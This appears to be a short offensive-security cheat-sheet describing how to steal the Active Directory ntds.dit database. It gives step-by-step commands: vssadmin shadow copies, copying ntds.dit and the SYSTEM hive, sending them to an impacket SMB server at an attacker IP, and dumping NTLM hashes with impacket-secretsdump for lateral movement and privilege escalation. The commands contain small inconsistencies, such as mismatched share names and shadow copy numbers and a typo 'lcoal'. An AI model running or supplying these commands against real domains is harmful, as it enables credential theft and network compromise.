the `ntds.dit` file is the Active Directory (AD) database that stores information about domain objects, including user accounts, passwords (in NTLM hash format) , groups and group membership. Extracting and cracking the NTDS.DIT file allows you to obtain domain credentials, which can be used for lateral movement and privilege escalation

---

### NTDS.DIT file location

```cmd
%SystemRoot%\NTDS\ntds.dit
```

OR

```cmd
C:\Windows\NTDS\ntds.dit
```

---

### Step 1: Create a Volume Shadow Copy

1.  List existing shadow copies

```cmd
vssadmin List Shadows
```

2.  Delete the oldest shadow copy(if needed)

```cmd
vssadmin Delete Shadows /For=C:\oldest
```

3.  Create a new shadow copy

```cmd
vssadmin create shadow /for=C:
```

</br>


### Step 2: Copy the NTDS.DIT and SYSTEM Files

```cmd
mkdir ntds
```

```cmd
copy \\?\GLOBALROOT\Device\HardDiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds\ntds.dit
```

```cmd
copy \\?\GLOBALROOT\Device\HardDiskVolumeShadowCopy1\windows\system32\config\system c:\ntds\system
```

Alternatively, save the SYSTEM registry hive directly

```cmd
reg save hklm\system c:\ntds\system
```


</br>


### Step 3: Transfer Files to Kali Linux

1.  Start the SMB Server

```bash
impacket-smbserver -smb2support -user user -password 12345 share /opt/share
```

2.  Copy files to the SMB server

```bash
copy ntds.dit \\192.168.29.218\Public\
```

</br>

### Step 4: Extract Password Hashes from NTDS.DIT

```bash
impacket-secretsdump -system system -ntds ntds.dit lcoal
```

```bash
impacket-secretsdump -system system -ntds ntds.dit -hashes lmhashes:nthash -outfile ntlm-extract local
```